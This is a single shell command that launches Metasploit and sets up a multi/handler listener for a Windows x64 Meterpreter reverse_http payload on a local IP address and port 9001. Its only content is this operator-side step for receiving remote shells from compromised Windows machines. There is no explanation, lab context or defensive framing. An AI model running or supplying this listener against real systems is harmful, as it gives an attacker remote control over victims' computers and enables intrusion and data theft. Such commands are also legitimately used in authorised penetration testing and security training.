sudo msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_http; set LHOST 192.168.1.139; set LPORT 9001; exploit"
